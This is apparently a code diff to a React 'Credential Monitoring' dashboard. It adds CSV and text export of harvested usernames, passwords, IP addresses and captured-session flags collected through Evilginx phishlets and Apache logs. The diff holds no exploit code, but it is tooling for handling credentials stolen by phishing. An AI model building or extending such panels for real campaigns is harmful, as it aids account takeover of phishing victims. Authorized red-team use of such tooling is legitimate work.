@@ -20,6 +20,8 @@ function Monitoring() {
     domains: ''
   });
 
+  const [showDownloadOptions, setShowDownloadOptions] = useState(false);
+
   useEffect(() => {
     // Initial load
     fetchCredentials();
@@ -366,6 +368,89 @@ function Monitoring() {
     }
   };
 
+    // Download functionality
+  const downloadCredentials = (format) => {
+    if (!credentials.length) {
+      setMessage({
+        type: 'error',
+        text: 'No credentials available to download.'
+      });
+      return;
+    }
+
+    let content = '';
+    let filename = '';
+    let mimeType = '';
+
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
+    const monitorName = activeMonitor && monitors[activeMonitor] 
+      ? monitors[activeMonitor].name.replace(/[^a-zA-Z0-9]/g, '_')
+      : 'all_monitors';
+
+    if (format === 'csv') {
+      // Create CSV content
+      const headers = ['Source', 'Domain', 'Username', 'Password', 'IP_Address', 'Session_Captured', 'Timestamp'];
+      const csvRows = [headers.join(',')];
+      
+      credentials.forEach(cred => {
+        const row = [
+          `"${cred.source_type === 'evilginx' ? 'Evilginx' : 'Apache'}"`,
+          `"${cred.domain || cred.phishlet || ''}"`,
+          `"${cred.username || ''}"`,
+          `"${cred.password || ''}"`,
+          `"${cred.ip || ''}"`,
+          `"${cred.session_captured ? 'Yes' : 'No'}"`,
+          `"${new Date(cred.timestamp).toLocaleString()}"`
+        ];
+        csvRows.push(row.join(','));
+      });
+      
+      content = csvRows.join('\n');
+      filename = `credentials_${monitorName}_${timestamp}.csv`;
+      mimeType = 'text/csv;charset=utf-8;';
+    } else if (format === 'txt') {
+      // Create text content
+      const header = `Credential Monitoring Report\n` +
+                    `Generated: ${new Date().toLocaleString()}\n` +
+                    `Monitor: ${activeMonitor && monitors[activeMonitor] ? monitors[activeMonitor].name : 'All Monitors'}\n` +
+                    `Total Credentials: ${credentials.length}\n` +
+                    `${'='.repeat(60)}\n\n`;
+      
+      const credentialEntries = credentials.map((cred, index) => {
+        return `Entry ${index + 1}:\n` +
+               `  Source: ${cred.source_type === 'evilginx' ? 'Evilginx' : 'Apache'}\n` +
+               `  Domain: ${cred.domain || cred.phishlet || 'N/A'}\n` +
+               `  Username: ${cred.username || 'N/A'}\n` +
+               `  Password: ${cred.password || 'N/A'}\n` +
+               `  IP Address: ${cred.ip || 'N/A'}\n` +
+               `  Session Captured: ${cred.session_captured ? 'Yes' : 'No'}\n` +
+               `  Timestamp: ${new Date(cred.timestamp).toLocaleString()}\n` +
+               `${'-'.repeat(40)}`;
+      }).join('\n\n');
+      
+      content = header + credentialEntries;
+      filename = `credentials_${monitorName}_${timestamp}.txt`;
+      mimeType = 'text/plain;charset=utf-8;';
+    }
+
+    // Create and trigger download
+    const blob = new Blob([content], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+
+    setShowDownloadOptions(false);
+    setMessage({
+      type: 'success',
+      text: `Credentials downloaded as ${format.toUpperCase()} successfully!`
+    });
+  };
+
   return (
     <div className="monitoring">
       <h1>Credential Monitoring</h1>
@@ -588,6 +673,34 @@ function Monitoring() {
             >
               Refresh
             </button>
+                       
+            {/* Download Button with Dropdown */}
+            <div className="download-container">
+              <button
+                className="btn btn-download"
+                onClick={() => setShowDownloadOptions(!showDownloadOptions)}
+                disabled={!credentials.length}
+              >
+                Download ({credentials.length})
+              </button>
+              
+              {showDownloadOptions && (
+                <div className="download-dropdown">
+                  <button
+                    className="download-option"
+                    onClick={() => downloadCredentials('csv')}
+                  >
+                    📊 Download as CSV
+                  </button>
+                  <button
+                    className="download-option"
+                    onClick={() => downloadCredentials('txt')}
+                  >
+                    📄 Download as Text
+                  </button>
+                </div>
+              )}
+            </div>
             <button
               className="btn btn-danger"
               onClick={clearCredentials}
@@ -650,6 +763,49 @@ function Monitoring() {
           text-transform: uppercase;
           color: white;
         }
+
+         .btn-download {
+          background-color: #17a2b8;
+          color: white;
+          position: relative;
+        }
+        .btn-download:disabled {
+          background-color: #6c757d;
+          cursor: not-allowed;
+        }
+        .download-container {
+          position: relative;
+          display: inline-block;
+        }
+        .download-dropdown {
+          position: absolute;
+          top: 100%;
+          right: 0;
+          background: white;
+          border: 1px solid #ddd;
+          border-radius: 4px;
+          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+          z-index: 1000;
+          min-width: 180px;
+        }
+        .download-option {
+          display: block;
+          width: 100%;
+          padding: 10px 15px;
+          border: none;
+          background: white;
+          text-align: left;
+          cursor: pointer;
+          font-size: 14px;
+          border-bottom: 1px solid #eee;
+        }
+        .download-option:hover {
+          background-color: #f8f9fa;
+        }
+        .download-option:last-child {
+          border-bottom: none;
+        }
+          
         .source-badge.evilginx {
           background-color: #ff5722;
         }
